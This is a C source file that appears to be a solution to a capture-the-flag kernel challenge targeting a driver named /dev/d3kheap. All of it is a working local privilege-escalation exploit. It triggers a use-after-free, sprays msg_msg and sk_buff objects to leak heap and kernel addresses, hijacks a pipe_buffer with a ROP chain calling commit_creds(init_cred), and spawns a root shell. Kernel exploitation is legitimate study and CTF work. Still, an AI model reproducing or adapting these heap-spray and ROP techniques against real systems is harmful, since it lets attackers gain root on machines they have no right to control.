#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
 
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <asm/ldt.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/socket.h>

int fd;
void add() { ioctl(fd, 0x1234); }
void dele() { ioctl(fd, 0xDEAD); }

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s:\033[0m %#lx\n", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

void get_root_shell(void)
{
	hexx("UID", getuid());
	char* args[] = { "/bin/sh", NULL };
	execve("/bin/sh", args, NULL);
}

size_t user_cs, user_ss, user_rflags, user_rsp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

struct msg_buf {
	long m_type;
	char m_text[1];
};

struct msg_header {
	void* l_next;
	void* l_prev;
	long m_type;
	size_t m_ts;
	void* next;
	void* security;
};

void fill_msg(struct msg_header* msg, void* l_next, void* l_prev, long m_type, size_t m_ts, void* next, void* security)
{
	msg->l_next = l_next;
	msg->l_prev = l_prev;
	msg->m_type = m_type;
	msg->m_ts = m_ts;
	msg->next = next;
	msg->security = security;
}

#define SOCKET_NUM 16
#define SK_BUFF_NUM 128 
int init_sockets(int sk_socket[SOCKET_NUM][2])
{
    /* socket pairs to spray sk_buff */
    for (int i = 0; i < SOCKET_NUM; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i]) < 0) {
            printf("[x] failed to create no.%d socket pair!\n", i);
            return -1;
        }
    }

    return 0;
}

int spray_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (write(sk_socket[i][0], buf, size) < 0) {
                printf("[x] failed to spray %d sk_buff for %d socket!", j, i);
                return -1;
            }
        }
    }

    return 0;
}

int free_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (read(sk_socket[i][1], buf, size) < 0) {
                puts("[x] failed to received sk_buff!");
                return -1;
            }
        }
    }

    return 0;
}

#define MSG_QUEUE_NUM 4096
#define PIPE_NUM 256
#define PRIMARY_MSG_TAG 0xAAAAAAAA
#define SECONDARY_MSG_TAG 0xBBBBBBBB
#define PRIMARY_MSG_TYPE 0x41
#define SECONDARY_MSG_TYPE 0x42
#define VICTIM_MSG_TYPE 0x111
#define ANON_PIPE_BUF_OPS 0xffffffff8203fe40
size_t pop_rdi = 0xffffffff810938f0; // pop rdi ; ret
size_t init_cred = 0xffffffff82c6d580;
size_t commit_creds = 0xffffffff810d25c0;
size_t swapgs_kpti = 0xFFFFFFFF81C01006;
size_t push_rsi_pop_rsp_pop_4 = 0xFFFFFFFF812DBEDE;

int main(int argc, char** argv, char** env)
{
	bind_core(0);
	save_status();
	int qid[MSG_QUEUE_NUM];
	int sk_socket[SOCKET_NUM][2];	
	int victim_id;
	int pipe_fd[PIPE_NUM][2];
	struct msg_buf* primary_msg;
	struct msg_buf* secondary_msg;
	struct msg_header* msg_msg;
	struct msg_header* nearby_msg;
	size_t l_next;
	size_t l_prev;
	size_t uaf_addr;		
	size_t kernel_offset;
	char message[0x2000];	
	char sk_msg[1024-320];
	
	if (init_sockets(sk_socket) == -1) err_exit("init_sockets");
	
	fd = open("/dev/d3kheap", O_RDONLY);
	puts("\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m");
	puts("[*] Build message queue...");
	for (int i = 0; i < MSG_QUEUE_NUM; i++)
	{
		if ((qid[i] = msgget(IPC_PRIVATE, 0666|IPC_CREAT)) < 0) err_exit("msgget");
	}

	puts("[*] Spray primary and secondary msg_msg...");
	add();
	for (int i = 0; i < MSG_QUEUE_NUM; i++)
	{
		primary_msg = (struct msg_buf*)message;
		primary_msg->m_type = PRIMARY_MSG_TYPE;
		*(int*)&primary_msg->m_text[0] = PRIMARY_MSG_TAG;
		*(int*)&primary_msg->m_text[4] = i;
		if (msgsnd(qid[i], primary_msg, 0x60-0x30, 0) < 0)
		{
			hexx("msgsnd error at primary", i);
			err_exit("msgsnd");
		}

		secondary_msg = (struct msg_buf*)message;
		secondary_msg->m_type = SECONDARY_MSG_TYPE;
		*(int*)&secondary_msg->m_text[0] = SECONDARY_MSG_TAG;
		*(int*)&secondary_msg->m_text[4] = i;
		if (msgsnd(qid[i], secondary_msg, 1024-0x30, 0) < 0)
		{
			hexx("msgsnd error at secondary", i);
			err_exit("msgsnd");
		}
		if (i == MSG_QUEUE_NUM/2) dele();
	}

	puts("\n\033[34m\033[1m[*] Step.II construct UAF\033[0m");
	puts("[*] Trigger UAF...");
	dele();

	puts("[*] spray sk_buff...");
	fill_msg((struct msg_header*)sk_msg, (void*)0xdeadbeef, (void*)0xdeadbeef, 0xdeadbeefbad, 1024, (void*)0, (void*)0);
	if (spray_sk_buff(sk_socket, sk_msg, sizeof(sk_msg)) < 0) err_exit("spary_sk_buff for get UAF chunk");

	victim_id = -1;
	for (int i = 0; i < MSG_QUEUE_NUM; i++)
	{
		if (msgrcv(qid[i], message, 1024-0x30, 1, MSG_COPY|IPC_NOWAIT) < 0)
		{
			hexx("Hit. the victim id", i);
			victim_id = i;
			break;
		}
	}			

	if (victim_id == -1) err_exit("Failed to construct UAF");
	
	puts("\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m");
	puts("[*] spray sk_buff...");
	if (free_sk_buff(sk_socket, sk_msg, sizeof(sk_msg)) < 0) err_exit("free_sk_buff");	
	fill_msg((struct msg_header*)sk_msg, (void*)0xdeadbeef, (void*)0xdeadbeef, VICTIM_MSG_TYPE, 0x1000-0x30, (void*)0, (void*)0);
	if (spray_sk_buff(sk_socket, sk_msg, sizeof(sk_msg)) < 0) err_exit("spary_sk_buff");

	puts("[*] OOB read from victim msg_msg");
	if (msgrcv(qid[victim_id], message, 0x1000-0x30, 1, MSG_COPY|IPC_NOWAIT) < 0) err_exit("OOB the kheap addr");
	binary_dump("msg_msg", message+8, 0x420);
	if (*(int*)(message+1024+8) != SECONDARY_MSG_TAG) err_exit("failed to read next msg_msg");

	nearby_msg = (struct msg_header*)(message+0x3d0+8);
	binary_dump("nearby msg header", nearby_msg, 0x40);
	l_next = (size_t)nearby_msg->l_next;
	l_prev = (size_t)nearby_msg->l_prev;
        hexx("nearby msg queue heap addr", l_next);
        hexx("nearby msg primary heap addr", l_prev);

	if (free_sk_buff(sk_socket, sk_msg, sizeof(sk_msg)) < 0) err_exit("free_sk_buff");	
	fill_msg((struct msg_header*)sk_msg, (void*)0xdeadbeef, (void*)0xdeadbeef, VICTIM_MSG_TYPE, 0x1000+0x60-0x30-8, (void*)(l_prev-8), (void*)0);
	if (spray_sk_buff(sk_socket, sk_msg, sizeof(sk_msg)) < 0) err_exit("spary_sk_buff");
	
	puts("[*] arbitrary read on primary msg of msg nearby victim");
	if (msgrcv(qid[victim_id], message, 0x1000+0x60-0x30-8, 1, MSG_COPY|IPC_NOWAIT) < 0) err_exit("ABR the kheap addr");
	binary_dump("msg_msg", message+8+0xfd0, 0x100);
	if (*(int*)(message+0x1000+8) != PRIMARY_MSG_TAG) err_exit("failed to ARB next msg_msg");
	
	nearby_msg =  (struct msg_header*)(message+8+0xfd0);
	binary_dump("nearby msg primary header", nearby_msg, 0x40);
	l_next = (size_t)nearby_msg->l_next;
	l_prev = (size_t)nearby_msg->l_prev;
  	uaf_addr = (size_t)l_next - 0x400;
	hexx("nearby msg heap addr", l_next);
        hexx("nearby msg queue heap addr", l_prev);
        hexx("uaf chunk addr", uaf_addr);

	puts("\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m");
	puts("[*] fixing the UAF obj as a msg_msg...");	
	if (free_sk_buff(sk_socket, sk_msg, sizeof(sk_msg)) < 0) err_exit("free_sk_buff");
	fill_msg((struct msg_header*)sk_msg, (void*)(uaf_addr+0x800), (void*)(uaf_addr+0x800), VICTIM_MSG_TYPE, 1024-0x30, (void*)0, (void*)0);
	if (spray_sk_buff(sk_socket, sk_msg, sizeof(sk_msg)) < 0) err_exit("spary_sk_buff");
	
	puts("[*] release UAF obj in message queue...");
	if (msgrcv(qid[victim_id], message, 1024-0x30, VICTIM_MSG_TYPE, 0) < 0) err_exit("release UAF obj");
	puts("[*] spray pipe_buffer...");
	for (int i = 0; i < PIPE_NUM; i++)
	{
		if (pipe(pipe_fd[i]) < 0) err_exit("create pipe");
		if (write(pipe_fd[i][1], "pwner", 5) < 0) err_exit("write pipe");
	}	

	puts("[*] release sk_buff to read pipe_buffer...");
	kernel_offset = -1;
	for (int i = 0; i < SOCKET_NUM; i++)
	{
		for (int j = 0; j < SK_BUFF_NUM; j++)
		{
			if (read(sk_socket[i][1], sk_msg, sizeof(sk_msg)) < 0) err_exit("release the sk_buff");
			int n = *(size_t*)(sk_msg+0x10);
			if (n > 0xffffffff81000000 && (n&0xfff) == 0xe40)
				kernel_offset = n - ANON_PIPE_BUF_OPS;
		}
	}
	
	if (kernel_offset == -1) err_exit("leak kernel_offset");
	hexx("kernel_offset", kernel_offset);


	size_t rop[] = {
		0,
		0,
		uaf_addr+0x20,
		0,
		pop_rdi+kernel_offset,
		push_rsi_pop_rsp_pop_4+kernel_offset,
		pop_rdi+kernel_offset,
		init_cred+kernel_offset,
		commit_creds+kernel_offset,
		swapgs_kpti+kernel_offset,
		0,
		0,
		get_root_shell,
		user_cs,
		user_rflags,
		user_rsp,
		user_ss
	};
	memcpy(sk_msg, (void*)rop, sizeof(rop));		

	puts("[*] spray sk_buff to hijack pipe_buffer...");
	if (spray_sk_buff(sk_socket, sk_msg, sizeof(sk_msg)) < 0) err_exit("spary sk_buff to hijack PEC");

	hexx("hijack gadget", push_rsi_pop_rsp_pop_4+kernel_offset);	
	for (int i = 0; i < PIPE_NUM; i++)
	{
		hexx("close pipe", i);
		close(pipe_fd[i][1]);
		close(pipe_fd[i][0]);
	}
	info("End!");
	return 0;
}
